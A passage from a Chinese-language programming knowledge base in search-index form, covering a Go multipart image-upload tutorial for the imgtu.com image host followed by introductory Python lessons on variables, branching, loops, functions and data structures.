jar} imgkr() } 接收到的数据包 进阶版 上面的数据包大概是没什么问题，但是图片的Content-Type是application/octet-stream，而一般情况下图片的应该是形如image/png 分析了一下原因，是因为CreateFormFile函数里面硬编码了 看里面的一些函数，也没找到直接设置这个地方的Content-Type的，所以我决定根据他的规则重新写一下。 分析这个函数，前面h是header头，也是我们要修改的地方，后面是调用*Writer.CreatePart，我们也模拟这个行为就可以了 所以微调一下代码（直接给代码复制粘贴过来改就可以了，也可以直接重写CreateFormFile函数，后者稍微麻烦一点点） 效果 目标达成，完整代码 package main import ( \"bytes\" \"fmt\" \"golang.org/x/net/publicsuffix\" \"io\" \"math/rand\" \"mime/multipart\" \"net/http\" \"net/http/cookiejar\" \"net/textproto\" \"os\" \"path/filepath\" \"strings\" ) var client http.Client var quoteEscaper = strings.NewReplacer(\"\\\\\", \"\\\\\\\\\", `\"`, \"\\\\\\\"\") func escapeQuotes(s string) string { return quoteEscaper.Replace(s) } func imgkr() { // 要上传的文件 imgFilePath := \"/Users/d4m1ts/d4m1ts/Upload/logo.png\" file, _ := os.Open(imgFilePath) defer file.Close() // 设置body数据并写入缓冲区 bodyBuff := bytes.NewBufferString(\"\") //bodyBuff := &bytes.Buffer{} bodyWriter := multipart.NewWriter(bodyBuff) _ = bodyWriter.SetBoundary(fmt.Sprintf(\"-----------------------------%d\", rand.Int())) // 加入图片二进制 h := make(textproto.MIMEHeader) h.Set(\"Content-Disposition\", fmt.Sprintf(`form-data; name=\"%s\"; filename=\"%s\"`, escapeQuotes(\"source\"), escapeQuotes(filepath.Base(file.Name())))) h.Set(\"Content-Type\", \"image/png\") part, _ := bodyWriter.CreatePart(h) _, _ = io.Copy(part, file) // 其他字段 _ = bodyWriter.WriteField(\"a\", \"b\") // 自动补充boundary结尾 bodyWriter.Close() fmt.Println(bodyBuff) //构建的完整数据包，没有header // 组合创建数据包 req, _ := http.NewRequest(\"POST\", \"http://127.0.0.1:8000\", bodyBuff) req.ContentLength = int64(bodyBuff.Len()) req.Header.Set(\"Content-Type\", bodyWriter.FormDataContentType()) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") client.Do(req) } func main() { jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client = http.Client{Jar: jar} imgkr() } 完整版 写了一个上传到https://imgtu.com/的，大家有需可以参考 为了方便以后的复制粘贴，给构造上传图片请求单独写到imgkr()函数中的，不然应该给结果解析也写里面的 package main import ( \"bytes\" \"fmt\" \"golang.org/x/net/publicsuffix\" \"io\" \"io/ioutil\" \"math/rand\" \"mime/multipart\" \"net/http\" \"net/http/cookiejar\" \"net/textproto\" \"os\" \"path/filepath\" \"regexp\" \"strings\" \"time\" \"github.com/json-iterator/go\" ) var client http.Client var quoteEscaper = strings.NewReplacer(\"\\\\\", \"\\\\\\\\\", `\"`, \"\\\\\\\"\") func escapeQuotes(s string) string { return quoteEscaper.Replace(s) } /* 获取上传图片需要的token */ func getToken() string { u := \"https://imgtu.com/\" req, _ := http.NewRequest(\"GET\", u, nil) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") resp, _ := client.Do(req) res,_ := ioutil.ReadAll(resp.Body) regex, _ := regexp.Compile(\"PF.obj.config.auth_token = \\\"(.*?)\\\";\") if regex.MatchString(string(res)){ token := regex.FindStringSubmatch(string(res))[1] return token } return \"\" } /* 构造上传请求 */ func imgkr(token string, imgFilePath string) *http.Request { // 上传网址 target := \"https://imgtu.com/json\" // 要上传的文件 file, _ := os.Open(imgFilePath) defer file.Close() // 设置body数据并写入缓冲区 bodyBuff := bytes.NewBufferString(\"\") //bodyBuff := &bytes.Buffer{} bodyWriter := multipart.NewWriter(bodyBuff) _ = bodyWriter.SetBoundary(fmt.Sprintf(\"-----------------------------%d\", rand.Int())) // 加入图片二进制 h := make(textproto.MIMEHeader) h.Set(\"Content-Disposition\", fmt.Sprintf(`form-data; name=\"%s\"; filename=\"%s\"`, escapeQuotes(\"source\"), escapeQuotes(filepath.Base(file.Name())))) h.Set(\"Content-Type\", \"image/png\") part, _ := bodyWriter.CreatePart(h) _, _ = io.Copy(part, file) // 其他字段 _ = bodyWriter.WriteField(\"type\", \"file\") _ = bodyWriter.WriteField(\"action\", \"upload\") _ = bodyWriter.WriteField(\"timestamp\", fmt.Sprintf(\"%d\", time.Now().UnixNano()/1e6)) _ = bodyWriter.WriteField(\"auth_token\", token) _ = bodyWriter.WriteField(\"nsfw\", \"0\") // 自动补充boundary结尾 _ = bodyWriter.Close() //fmt.Println(bodyBuff) //构建的完整数据包，没有header // 创建请求 req, _ := http.NewRequest(\"POST\", target, bodyBuff) req.ContentLength = int64(bodyBuff.Len()) req.Header.Set(\"Content-Type\", bodyWriter.FormDataContentType()) req.Header.Set(\"User-Agent\", \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\") return req } func main() { jar, _ := cookiejar.New(&cookiejar.Options{PublicSuffixList: publicsuffix.List}) client = http.Client{Jar: jar} token := getToken() req := imgkr(token, \"/Users/d4m1ts/d4m1ts/Upload/logo.png\") resp, _ := client.Do(req) res, _ := ioutil.ReadAll(resp.Body) imageUrl := jsoniter.Get(res, \"image\").Get(\"url\") fmt.Println(imageUrl.ToString()) } 效果 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-08-26 17:45:56 "},"知识库/04.编程开发/02.Python/01.变量和类型.html":{"url":"知识库/04.编程开发/02.Python/01.变量和类型.html","title":"01.变量和类型","keywords":"","body":"变量和类型 在程序设计中，变量是一种存储数据的载体。计算机中的变量是实际存在的数据或者是存储器中存储数据的一块内存空间，变量的值可以被读取和修改，这是所有计算和控制的基础。计算机能处理的数据有很多类型，除了数值之外还可以处理文本、图形，音频，视频等各种各样的数据，那么不同的数据就需要定义不同的存储类型。Python中的数据类型很多，而且也允许我们自定义新的数据类型。 整形： Python中可以处理任意大小的整数（Python 2.x中有 int和long两种类型的整数，但这种区分对Python来说意义不大，因此在Python 3.x中整数只有int这一种了），而且支持二进制（如0b100，换算成十进制是4）、八进制（如0o100，换算成十进制是64）、十进制（100）和十六进制（0x100，换算成十进制是256）的表示法。 浮点型： 浮点数也就是小数，之所以称为浮点数，是因为按照科学记数法表示时，一个浮点数的小数点位置是可变的，浮点数除了数学写法（如123.456）之外还支持科学计数法（如1.23456e2）。 字符串型： 字符串是以单引号或双引号括起来的任意文本，比如'hello'和\"hello\",字符串还有原始字符串表示法、字节字符串表示法、Unicode字符串表示法，而且可以书写成多行的形式（用三个单引号或三个双引号开头，三个单引号或三个双引号结尾）。 布尔型：布尔值只有True、False两种值，要么是True，要么是False，在Python中，可以直接用True、False表示布尔值（请注意大小写），也可以通过布尔运算计算出来（例如3 会产生布尔值True，而2 == 1会产生布尔值False） 复数型：形如3+5j，跟数学上的复数表示一样，唯一不同的是虚部的i换成了j。 变量命名 对于每个变量我们需要给它取一个名字，就如同我们每个人都有属于自己的响亮的名字一样。在Python中，变量命名需要遵循以下这些必须遵守硬性规则和强烈建议遵守的非硬性规则。 硬性规则： 变量名有字母（广义的Unicode字符，不包含特殊字符）、数字和下划线构成，数字不能开头 大小写敏感 不要跟关键字（有特殊含义的单词）和系统保留字（如函数、模块等的名字）冲突 PE 8 要求 用小写字母拼写，多个单词用下划线连接 受保护的实例属性用单个下划线开头 私有的实例属性用两个下划线开头 变量的使用 a = 321 b = 123 print(a+b) print(a-b) print (a*b) print(a/b) print(a//b) print(a % b) print(a**b) a = int(input('a=')) b = int(input('b=')) print('%d + %d = %d' % (a, b, a+b)) print('%d - %d = %d' % (a, b, a-b)) print('%d * %d = %d' % (a, b, a*b)) print('%d / %d = %.2f' % (a, b, a/b)) print('%d // %d = %d' % (a, b, a//b)) print('%d %% %d = %d' % (a, b, a % b)) print('%d ** %d = %d' % (a, b, a**b)) a = 100 b = 'aaaa' c = 5 + 76j d = 123.34 e = True print(type(a)) print(type(b)) print(type(c)) print(type(d)) print(type(e)) 在对变量类型进行转换时可以使用Python的内置函数（准确的说下面列出的并不是真正意义上的函数，而是后面我们要讲到的创建对象的构造方法）。 int()：将一个数值或字符串转换成整数，可以指定进制。 float()：将一个字符串转换成浮点数。 str()：将指定的对象转换成字符串形式，可以指定编码。 chr()：将整数转换成该编码对应的字符串（一个字符）。 ord()：将字符串（一个字符）转换成对应的编码（整数）。 运算符 Python支持多种运算符，下表大致按照优先级从高到低的顺序列出了所有的运算符，我们会陆续使用到它们。 运算符 描述 [] [:] 下标，切片 ** 指数 ~ + - 按位取反, 正负号 * / % // 乘，除，模，整除 + - 加，减 >> 右移，左移 & 按位与 ^ ` ` > >= 小于等于，小于，大于，大于等于 == != 等于，不等于 is is not 身份运算符 in not in 成员运算符 not or and 逻辑运算符 = += -= *= /= %= //= **= &= ` =`^= >>= 练习 # -*- coding:utf-8 -*- ''' @Description: null @Version: 1.0 @Autor: AaronLuo @Date: 2020-01-29 18:45:29 @LastEditors : AaronLuo @LastEditTime : 2020-01-29 20:06:10 ''' # 输入华摄度转摄氏度 # F = 1.8C + 32 def gbkChange(str): return str.decode('utf-8').encode('gbk') f = float(input(gbkChange('请输入华摄度:\\t1'))) C = (f-32)/1.8 print(gbkChange('%.2f华摄度 = %.2f摄氏度' % (f, C))) import math def gbkChange(str): return str.decode('utf-8').encode('gbk') # 输入圆的半径计算计算周长和面积 # S = πR^2 # C = 2πR r = float(input(gbkChange('请输入半径:\\t'))) s = math.pi * r * r c = math.pi * r * 2 print(gbkChange('周长为：%.2f,面积为：%.2f' % (s, c))) # 输入年份判断闰平年 def gbkChange(str): return str.decode('utf-8').encode('gbk') # 输入年份判断闰平年 year = int(input(gbkChange('请输入年份:'))) if(year % 4 == 0 and year % 100 != 0 or year % 400 == 0): print(gbkChange('%d年是闰年' % year)) else: print(gbkChange('%d年是平年' % year)) Windows Python2.7 编码解决 # -*- coding:utf-8 -*- # unicode 先解码为utf-8,再编码为windows可识别的gbk def gbkChange(str): return str.decode('utf-8').encode('gbk') Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-02-08 18:55:22 "},"知识库/04.编程开发/02.Python/02-分支结构.html":{"url":"知识库/04.编程开发/02.Python/02-分支结构.html","title":"02-分支结构","keywords":"","body":"分支结构 分支结构的应用场景 迄今为止，我们写的Python代码都是一条一条语句顺序执行，这种结构的代码我们称之为顺序结构。然而仅有顺序结构并不能解决所有的问题，比如我们设计一个游戏，游戏第一关的通关条件是玩家获得1000分，那么在完成本局游戏后我们要根据玩家得到分数来决定究竟是进入第二关还是告诉玩家“Game Over”，这里就会产生两个分支，而且这两个分支只有一个会被执行，这就是程序中分支结构。 if语句的使用 在Python中，要构造分支结构可以使用if、elif和else关键字。所谓关键字就是有特殊含义的单词，像if和else就是专门用于构造分支结构的关键字，很显然你不能够使用它作为变量名（事实上，用作其他的标识符也是不可以） demo username = input('请输入用户名:') password = input('请输入密码:') if username == 'admin' and password = '123456': print('身份验证成功') else: print('身份验证失败') 唯一需要说明的是和C/C++、Java等语言不同，Python中没有用花括号来构造代码块而是使用了缩进的方式来设置代码的层次结构，如果if条件成立的情况下需要执行多条语句，只要保持多条语句具有相同的缩进就可以了，换句话说连续的代码如果又保持了相同的缩进那么它们属于同一个代码块，相当于是一个执行的整体。 当然如果要构造出更多的分支，可以使用if…elif…else…结构，例如下面的分段函数求值 demo_1 \"\"\" 3x - 5 (x > 1) f(x) = x + 2 (-1 1: y = 3 * x - 5 elif x >= -1 and x 当然根据实际开发的需要，分支结构是可以嵌套的，例如判断是否通关以后还要根据你获得的宝物或者道具的数量对你的表现给出等级（比如点亮两颗或三颗星星），那么我们就需要在if的内部构造出一个新的分支结构，同理elif和else中也可以再构造新的分支，我们称之为嵌套的分支结构，也就是说上面的代码也可以写成下面的样子 \"\"\" 3x - 5 (x > 1) f(x) = x + 2 (-1 1: y = 3 * x - 5 else: if x >= -1: y = x + 2 else: y = 5 * x + 3 print ('f(%.2f) = %.2f' % (x, y)) 练习 练习1：英制单位与公制单位互换 def gbkChange(str): return str.decode('utf-8').encode('gbk') def utfChange(str): return str.decode('gbk').encode('utf-8') value = float(input(gbkChange('请输入长度'))) unit = utfChange(raw_input(gbkChange('请输入单位:'))) if unit == 'in' or unit == '英寸': print(gbkChange('%f英寸 = %f厘米' % (value, value*2.54))) elif unit == 'cm' or unit == '厘米': print(gbkChange('%f厘米 = %f英寸' % (value, value/2.54))) else: print(gbkChange('请输入有效单位')) 练习2：掷骰子决定做什么 from random import randint x = randint(1, 6) if x == 1: print 1 elif x == 2: print 2 elif x == 3: print 3 elif x == 4: print 4 elif x == 5: print 5 elif x == 6: print 6 练习3：百分制成绩转等级制 \"\"\" 百分制成绩转等级制成绩 90分以上 --> A 80分~89分 --> B 70分~79分 --> C 60分~69分 --> D 60分以下 --> E \"\"\" score = float(input(gbkChange('请输入成绩:'))) if score >= 90: x = 'A' elif score >= 80 and score = 70 and score = 60 and score 练习4：输入三条边长如果能构成三角形就计算周长和面积 import math a = float(input('a=')) b = float(input('b=')) c = float(input('c=')) if a + b > c and a + c > b and b + c > a: C = a + b + c area = math.sqrt(C / 2 * (C / 2 - a) * (C / 2 - b) * (C / 2 - c)) print(gbkChange('周长为%.2f,面积为%.2f' % (C, area))) else: print(gbkChange('无法构成三角形')) Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-02-08 19:00:10 "},"知识库/04.编程开发/02.Python/03-循环结构.html":{"url":"知识库/04.编程开发/02.Python/03-循环结构.html","title":"03-循环结构","keywords":"","body":"循环结构 循环结构的应用场景 如果在程序中我们需要重复的执行某条或某些指令，例如用程序控制机器人踢足球，如果机器人持球而且还没有进入射门范围，那么我们就要一直发出让机器人向球门方向奔跑的指令。当然你可能已经注意到了，刚才的描述中其实不仅仅有需要重复的动作，还有我们上一个章节讲到的分支结构。再举一个简单的例子，比如在我们的程序中要实现每隔1秒中在屏幕上打印一个\"hello, world\"这样的字符串并持续一个小时，我们肯定不能够将print('hello, world')这句代码写上3600遍，如果真的需要这样做那么编程的工作就太无聊了。因此，我们需要了解一下循环结构，有了循环结构我们就可以轻松的控制某件事或者某些事重复、重复、再重复的发生。在Python中构造循环结构有两种做法，一种是for-in循环，一种是while循环。 for - in循环 如果明确的知道循环执行的次数或者是要对一个容器进行迭代（后面会讲到），那么我们推荐使用for-in循环 \"\"\" 用for循环实现1~100求和 \"\"\" sum = 0 for x in range(101): sum += x print(sum) 需要说明的是上面代码中的range类型，range可以用来产生一个不变的数值序列，而且这个序列通常都是用在循环中的，例如： range(101)可以产生一个0到100的整数序列。 range(1, 100)可以产生一个1到99的整数序列。 range(1, 100, 2)可以产生一个1到99的奇数序列，其中的2是步长，即数值序列的增量。 实现1~100之间的偶数求和 sum = 0 for x in range(2, 101, 2): sum += x print(sum) 通过在循环中使用分支结构的方式来实现相同的功能，代码如下所示 sum = 0 for x in range(1, 101): if x % 2 == 0: sum += x print(sum) while循环 如果要构造不知道具体循环次数的循环结构，我们推荐使用while循环，while循环通过一个能够产生或转换出bool值的表达式来控制循环，表达式的值为True循环继续，表达式的值为False循环结束。下面我们通过一个“猜数字”的小游戏（计算机出一个1~100之间的随机数，人输入自己猜的数字，计算机给出对应的提示信息，直到人猜出计算机出的数字）来看看如何使用while循环。 \"\"\" 猜数字游戏 计算机出一个1~100之间的随机数由人来猜 计算机根据人猜的数字分别给出提示大一点/小一点/猜对了 \"\"\" import random answer = random.randint(1, 100) counter = 0 while True: counter += 1 number = int(input('input: ')) if number answer: print('smaller') else: print('yes!') break print('all guess %d ' % counter) if counter > 7: print('sb') 说明：上面的代码中使用了break关键字来提前终止循环，需要注意的是break只能终止它所在的那个循环，这一点在使用嵌套的循环结构（下面会讲到）需要引起注意。除了break之外，还有另一个关键字是continue，它可以用来放弃本次循环后续的代码直接让循环进入下一轮。 与分支结构一样，循环结构也是可以嵌套的，也就是说在循环中还可以构造循环结构。下面的例子演示了如何通过嵌套的循环来输出一个九九乘法表。 for i in range(1, 10): for j in range(1, i+1): print('%d * %d = %d\\n' % (i, j, i*j)) 练习 练习1：判断一个数是否为素数 import math num = int(input('input:')) end = int(math.sqrt(num)) is_Prime = True for i in range(2, end+1): if(num % i == 0): is_Prime = False break if is_Prime and num != 1: print('yes!') else: print('no!') 练习2：输入两个正整数，计算最大公约数和最小公倍数 x = int(input('x = ')) y = int(input('y = ')) if x > y: x, y = y, x for i in range(x, 0, -1): if x % i == 0 and y % i == 0: print('%d,%d big num = %d' % (x, y, i)) print('%d,%d small num = %d' % (x, y, x*y//i)) break Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2020-03-18 20:25:44 "},"知识库/04.编程开发/02.Python/04-函数与模块.html":{"url":"知识库/04.编程开发/02.Python/04-函数与模块.html","title":"04-函数与模块","keywords":"","body":"函数与模块 先研究一道数学题，请说出下面的方程有多少组正整数解。 事实上，上面的问题等同于将8个苹果分成四组每组至少一个苹果有多少种方 解题思路：将8个苹果分成四组，每一组至少有一个，那么就是有7个空位中间插入3个隔板，C(7,3) m = int(input('m = ')) n = int(input('n = ')) fm = 1 for num in range(1, m + 1): fm *= num fn = 1 for num in range(1, n + 1): fn *= num fmn = 1 for num in range(1, m - n + 1): fmn *= num print(fm // fn // fmn) 函数的作用 不知道大家是否注意到，在上面的代码中，我们做了3次求阶乘，这样的代码实际上就是重复代码。编程大师Martin Fowler先生曾经说过：“代码有很多种坏味道，重复是最坏的一种！”，要写出高质量的代码首先要解决的就是重复代码的问题。对于上面的代码来说，我们可以将计算阶乘的功能封装到一个称之为“函数”的功能模块中，在需要计算阶乘的地方，我们只需要“调用”这个“函数”就可以了。 定义函数 在Python中可以使用def关键字来定义函数，和变量一样每个函数也有一个响亮的名字，而且命名规则跟变量的命名规则是一致的。在函数名后面的圆括号中可以放置传递给函数的参数，这一点和数学上的函数非常相似，程序中函数的参数就相当于是数学上说的函数的自变量，而函数执行完成后我们可以通过return关键字来返回一个值，这相当于数学上说的函数的因变量 在了解了如何定义函数后，我们可以对上面的代码进行重构，所谓重构就是在不影响代码执行结果的前提下对代码的结构进行调整，重构之后的代码如下所示 def factorial(num): if num == 1: return num else: return num * factorial(num - 1) 函数的参数 函数是绝大多数编程语言中都支持的一个代码的“构建块”，但是Python中的函数与其他语言中的函数还是有很多不太相同的地方，其中一个显著的区别就是Python对函数参数的处理。在Python中，函数的参数可以有默认值，也支持使用可变参数，所以Python并不需要像其他语言一样支持函数的重载，因为我们在定义一个函数的时候可以让它有多种不同的使用方式，下面是两个小例子。 import random as x def roll_dice(n=2): total = 0 for _ in range(n): total += x.randint(1, 6) return total def add(a=0, b=0, c=0): return a+b+c print roll_dice(3) print roll_dice() print add(1, 2, 3) print add() 我们给上面两个函数的参数都设定了默认值，这也就意味着如果在调用函数的时候如果没有传入对应参数的值时将使用该参数的默认值，所以在上面的代码中我们可以用各种不同的方式去调用add函数，这跟其他很多语言中函数重载的效果是一致的。 其实上面的add函数还有更好的实现方案，因为我们可能会对0个或多个参数进行加法运算，而具体有多少个参数是由调用者来决定，我们作为函数的设计者对这一点是一无所知的，因此在不确定参数个数的时候，我们可以使用可变参数，代码如下所示。 def add(*args): total = 0 for val in args: total += val return total 用模块管理函数 对于任何一种编程语言来说，给变量、函数这样的标识符起名字都是一个让人头疼的问题，因为我们会遇到命名冲突这种尴尬的情况。最简单的场景就是在同一个.py文件中定义了两个同名函数，由于Python没有函数重载的概念，那么后面的定义会覆盖之前的定义，也就意味着两个函数同名函数实际上只有一个是存在的。 def foo(): print('hello, world!') def foo(): print('goodbye, world!') # 下面的代码会输出什么呢？ foo() # goodbye, world! 当然上面的这种情况我们很容易就能避免，但是如果项目是由多人协作进行团队开发的时候，团队中可能有多个程序员都定义了名为foo的函数，那么怎么解决这种命名冲突呢？答案其实很简单，Python中每个文件就代表了一个模块（module），我们在不同的模块中可以有同名的函数，在使用函数的时候我们通过import关键字导入指定的模块就可以区分到底要使用的是哪个模块中的foo函数，代码如下所示 module1.py def foo(): print('hello, world!') module2.py def foo(): print('goodbye, world!') test.py from module1 import foo # 输出hello, world! foo() from module2 import foo # 输出goodbye, world! foo() 也可以按照如下所示的方式来区分到底要使用哪一个foo函数。 test.py import module1 as m1 import module2 as m2 m1.foo() m2.foo() 但是如果将代码写成了下面的样子，那么程序中调用的是最后导入的那个foo，因为后导入的foo覆盖了之前导入的foo。 test.py from module1 import foo from module2 import foo # 输出goodbye, world! foo() test.py from module2 import foo from module1 import foo # 输出hello, world! foo() 需要说明的是，如果我们导入的模块除了定义函数之外还中有可以执行代码，那么Python解释器在导入这个模块时就会执行这些代码，事实上我们可能并不希望如此，因此如果我们在模块中编写了执行代码，最好是将这些执行代码放入如下所示的条件中，这样的话除非直接运行该模块，if条件下的这些代码是不会执行的，因为只有直接执行的模块的名字才是“main”。 module3.py def foo(): print 'hello world' def bar(): print 'pass' # __name__是Python中一个隐含的变量它代表了模块的名字 # 只有被Python解释器直接执行的模块的名字才是__main__ if __name__ == '__main__': print('call foo()') foo() print('call bar()') bar() test.py import module3 # 导入module3时 不会执行模块中if条件成立时的代码 因为模块的名字是module3而不是__main__ 练习 练习1：实现计算求最大公约数和最小公倍数的函数 def gcd(x, y): # (x, y) = (y, x) if x > y else (x, y) (x, y) = [(y, x), (x, y)][x 练习2：实现判断一个数是不是回文数的函数 def is_palindrome(num): temp = num total = 0 while temp > 0: total = total * 10 + temp % 10 temp //= 10 return total == num 练习3：实现判断一个数是不是素数的函数 def is_prime(num): for factor in range(2, num): if num % factor == 0: return False # return True if num != 1 else False return [True,False][num == 1] 练习4：写一个程序判断输入的正整数是不是回文素数 if __name__ == '__main__': num = int(input('num = ')) if is_prime(num) and is_palindrome(num): print True else: print False 通过上面的程序可以看出，当我们将代码中重复出现的和相对独立的功能抽取成函数后，我们可以组合使用这些函数来解决更为复杂的问题，这也是我们为什么要定义和使用函数的一个非常重要的原因。 最后，我们来讨论一下Python中有关变量作用域的问题 def foo(): b = 'hello' def bar(): # Python中可以在函数内部再定义函数 c = True print(a) print(b) print(c) bar() # print(c) # NameError: name 'c' is not defined if __name__ == '__main__': a = 100 # print(b) # NameError: name 'b' is not defined foo() 上面的代码能够顺利的执行并且打印出100和“hello”，但我们注意到了，在bar函数的内部并没有定义a和b两个变量，那么a和b是从哪里来的。我们在上面代码的if分支中定义了一个变量a，这是一个全局变量（global variable），属于全局作用域，因为它没有定义在任何一个函数中。在上面的foo函数中我们定义了变量b，这是一个定义在函数中的局部变量（local variable），属于局部作用域，在foo函数的外部并不能访问到它；但对于foo函数内部的bar函数来说，变量b属于嵌套作用域，在bar函数中我们是可以访问到它的。bar函数中的变量c属于局部作用域，在bar函数之外是无法访问的。事实上，Python查找一个变量时会按照“局部作用域”、“嵌套作用域”、“全局作用域”和“内置作用域”的顺序进行搜索，前三者我们在上面的代码中已经看到了，所谓的“内置作用域”就是Python内置的那些隐含标识符min、len等都属于内置作用域）。 再看看下面这段代码，我们希望通过函数调用修改全局变量a的值，但实际上下面的代码是做不到的。 def foo(): a = 200 print(a) # 200 if __name__ == '__main__': a = 100 foo() print(a) # 100 在调用foo函数后，我们发现a的值仍然是100，这是因为当我们在函数foo中写a = 200的时候，是重新定义了一个名字为a的局部变量，它跟全局作用域的a并不是同一个变量，因为局部作用域中有了自己的变量a，因此foo函数不再搜索全局作用域中的a。如果我们希望在foo函数中修改全局作用域中的a，代码如下所示。 def foo(): global a a = 200 print(a) # 200 if __name__ == '__main__': a = 100 foo() print(a) # 200 我们可以使用global关键字来指示foo函数中的变量a来自于全局作用域，如果全局作用域中没有a，那么下面一行的代码就会定义变量a并将其置于全局作用域。同理，如果我们希望函数内部的函数能够修改嵌套作用域中的变量，可以使用nonlocal关键字来指示变量来自于嵌套作用域，请大家自行试验。 在实际开发中，我们应该尽量减少对全局变量的使用，因为全局变量的作用域和影响过于广泛，可能会发生意料之外的修改和使用，除此之外全局变量比局部变量拥有更长的生命周期，可能导致对象占用的内存长时间无法被垃圾回收)。事实上，减少对全局变量的使用，也是降低代码之间耦合度的一个重要举措，同时也是对迪米特法则的践行。减少全局变量的使用就意味着我们应该尽量让变量的作用域在函数的内部，但是如果我们希望将一个局部变量的生命周期延长，使其在函数调用结束后依然可以访问，这时候就需要使用闭包)，这个我们在后续的内容中进行讲解。 def foo(b): def bar(a): return a+b return bar if __name__ == '__main__': print(foo(100)(200)) #300 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-06-07 11:09:37 "},"知识库/04.编程开发/02.Python/05-字符串和常用数据结构.html":{"url":"知识库/04.编程开发/02.Python/05-字符串和常用数据结构.html","title":"05-字符串和常用数据结构","keywords":"","body":"字符串和常用数据结构 使用字符串 第二次世界大战促使了现代电子计算机的诞生，当初的想法很简单，就是用计算机来计算导弹的弹道，因此在计算机刚刚诞生的那个年代，计算机处理的信息主要是数值，而世界上的第一台电子计算机ENIAC每秒钟能够完成约5000次浮点运算。随着时间的推移，虽然对数值运算仍然是计算机日常工作中最为重要的事情之一，但是今天的计算机处理得更多的数据都是以文本信息的方式存在的，而Python表示文本信息的方式我们在很早以前就说过了，那就是字符串类型。所谓字符串，就是由零个或多个字符组成的有限序列，a{1}a{2}....a{n} def main(): str1 = 'hello world' print(len(str1)) # 计算长度 print(str1.capitalize()) # 首字符大写拷贝 print(str1.upper()) # 所有字符大写拷贝 print(str1.lower()) # 所有字符小写拷贝 print(str1.find('or')) # 查找子串位置 print(str1.find('shit')) # print(str1.index('or')) # 与find类似，找不到抛出错误 # print(str1.index('shit')) print(str1.startswith('He')) # 查找字符串开头是否以子串开头 print(str1.startswith('he')) print(str1.endswith('d')) # 查找字符串结尾是否以子串开头 print(str1.endswith('D')) print(str1.center(50, '*')) # 将字符串以指定的宽度居中并在两侧填充指定的字符 print(str1.rjust(50, '*')) # 将字符串以指定的宽度靠右放置左侧填充指定的字符 print(str1.ljust(50, '*')) # 将字符串以指定的宽度靠左放置左侧填充指定的字符 # 从字符串中取出指定位置的字符(下标运算) str2 = 'abcdefg123456' print(str2[2]) # c print(str2[2:5]) # cde print(str2[2:]) # cdefg123456 print(str2[2::2]) # ceg246 print(str2[::2]) # aceg246 print(str2[::-1]) # 654321gfedcba print(str2[-3:-1]) # 45 print(str2.isdigit()) # 检查字符串是否全由数字构成 print(str2.isalpha()) # 检查字符串是否全由字母构成 print(str2.isalnum()) # 检查字符串是否由数字+字母构成 str3 = ' hello world ' print(str3.strip()) # 去除字符串左右的多余空格拷贝 if __name__ == '__main__': main() 除了字符串，Python还内置了多种类型的数据结构，如果要在程序中保存和操作数据，绝大多数时候可以利用现有的数据结构来实现，最常用的包括列表、元组、集合和字典 使用列表 下面的代码演示了如何定义列表、使用下标访问列表元素以及添加和删除元素的操作。 def main(): list1 = [1, 3, 5, 7, 100] print(list1) list2 = ['hello'] * 5 print(list2) # 计算列表长度(元素个数) print(len(list1)) # 下标(索引)运算 print(list1[0]) print(list1[4]) # print(list1[5]) # IndexError: list index out of range print(list1[-1]) print(list1[-3]) list1[2] = 300 print(list1) # 添加元素 list1.append(200) list1.insert(1, 400) list1 += [1000, 2000] print(list1) print(len(list1)) # 删除元素 list1.remove(3) if 1234 in list1: list1.remove(1234) del list1[0] print(list1) # 清空列表元素 list1.clear() print(list1) if __name__ == '__main__': main() 下面的代码实现了对列表的排序操作。 def main(): list1 = ['orange', 'apple', 'zoo', 'internationalization', 'blueberry'] list2 = sorted(list1) # sorted函数返回列表排序后的拷贝不会修改传入的列表 # 函数的设计就应该像sorted函数一样尽可能不产生副作用 list3 = sorted(list1, reverse=True) # 通过key关键字参数指定根据字符串长度进行排序而不是默认的字母表顺序 list4 = sorted(list1, key=len) print(list1) print(list2) print(list3) print(list4) # 给列表对象发出排序消息直接在列表对象上进行排序 list1.sort(reverse=True) print(list1) if __name__ == '__main__': main() 我们还可以使用列表的生成式语法来创建列表，代码如下所示。 import sys def main(): f = [x for x in range(1, 10)] print(f) f = [x + y for x in 'ABCDE' for y in '1234567'] print(f) # 用列表的生成表达式语法创建列表容器 # 用这种语法创建列表之后元素已经准备就绪所以需要耗费较多的内存空间 f = [x ** 2 for x in range(1, 1000)] print(sys.getsizeof(f)) # 查看对象占用内存的字节数 print(f) # 请注意下面的代码创建的不是一个列表而是一个生成器对象 # 通过生成器可以获取到数据但它不占用额外的空间存储数据 # 每次需要数据的时候就通过内部的运算得到数据(需要花费额外的时间) f = (x ** 2 for x in range(1, 1000)) print(sys.getsizeof(f)) # 相比生成式生成器不占用存储数据的空间 print(f) for val in f: print(val) if __name__ == '__main__': main() 除了上面提到的生成器语法，Python中还有另外一种定义生成器的方式，就是通过yield关键字将一个普通函数改造成生成器函数。下面的代码演示了如何实现一个生成斐波拉切数列的生成器。所谓斐波拉切数列可以通过下面递归的方法来进行定义： def fib(n): a, b = 0, 1 for _ in range(n): a, b = b, a + b yield a def main(): for val in fib(20): print(val) if __name__ == '__main__': main() 使用元组 Python 的元组与列表类似，不同之处在于元组的元素不能修改，在前面的代码中我们已经不止一次使用过元组了。顾名思义，我们把多个元素组合到一起就形成了一个元组，所以它和列表一样可以保存多条数据。下面的代码演示了如何定义和使用元组。 def main(): # 定义元组 t = ('aaron', 22, True, '四川') print(t) # 获取元组中的元素 print(t[0]) print(t[3]) # 遍历元组中的值 for member in t: print(member) # 重新给元组赋值 # t[0] = '王大锤' # TypeError # 变量t重新引用了新的元组原来的元组将被垃圾回收 t = ('王大锤', 20, True, '云南昆明') print(t) # 将元组转换成列表 person = list(t) print(person) # 列表是可以修改它的元素的 person[0] = 